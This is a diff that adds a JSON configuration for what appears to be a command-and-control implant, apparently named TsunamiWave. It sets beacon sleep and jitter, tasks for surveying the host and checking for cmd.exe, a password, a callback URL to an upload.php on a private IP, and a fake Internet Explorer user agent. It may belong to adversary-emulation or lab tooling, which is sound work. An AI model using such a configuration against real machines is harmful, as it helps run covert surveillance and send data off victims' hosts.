@@ -1,0 +1,41 @@
+{
+  "binary_id": 12345,
+  "agent_id": 6789,
+  "password": "{E3AEA3F6-D548-4989-9A42-80BAC9321AE0}",
+  "initial_messages": [
+    {
+      "command": "trigger_sleep_request",
+      "message_id": 0,
+      "trigger_sleep_request": {
+        "sleep_seconds": 5,
+        "variation_seconds": 6
+      }
+    },
+    {
+      "command": "survey_host_request",
+      "message_id": 0,
+      "survey_host_request": {
+
+      }
+    }
+  ],
+  "periodic_messages": [
+    {
+      "command": "trigger_sleep_request",
+      "message_id": 0,
+      "trigger_sleep_request": {
+        "sleep_seconds": 20,
+        "variation_seconds": 0
+      }
+    },
+    {
+      "command": "survey_process_request",
+      "message_id": 0,
+      "survey_process_request": {
+        "process_entries": [ "cmd.exe" ]
+      }
+    }
+  ],
+  "callback_url": "http://192.168.126.130/upload.php",
+  "user_agent": "Mozilla/5.0 (compatible, MSIE 11, Windows NT 6.3; Trident/7.0; rv:11.0) like TsunamiWave"
+}
